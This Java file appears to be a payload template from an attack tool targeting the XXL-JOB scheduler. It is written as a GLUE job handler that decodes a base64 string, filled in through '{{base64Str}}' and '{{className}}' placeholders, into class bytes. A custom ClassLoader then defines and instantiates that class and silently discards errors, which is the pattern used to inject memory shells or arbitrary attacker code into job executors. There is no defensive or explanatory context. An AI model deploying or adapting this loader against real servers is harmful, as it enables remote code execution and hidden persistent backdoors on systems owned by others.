import com.xxl.job.core.biz.model.ReturnT;
import com.xxl.job.core.handler.IJobHandler;

public class DemoGlueJobHandler extends IJobHandler {

    public static class Definder extends ClassLoader {
        public Definder() {
            super(Thread.currentThread().getContextClassLoader());
        }

        public Class<?> defineClass(byte[] bytes) {
            return defineClass(null, bytes, 0, bytes.length);
        }
    }

    public ReturnT<String> execute(String param) throws Exception {
        String base64Str = "{{base64Str}}";
        String className = "{{className}}";
        try {
            Class.forName(className);
        } catch (ClassNotFoundException e) {
            try {
                new Definder().defineClass(decodeBase64(base64Str)).newInstance();
            } catch (Throwable ee) {
                ee.printStackTrace();
            }
        }
        return ReturnT.SUCCESS;
    }

    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }
}
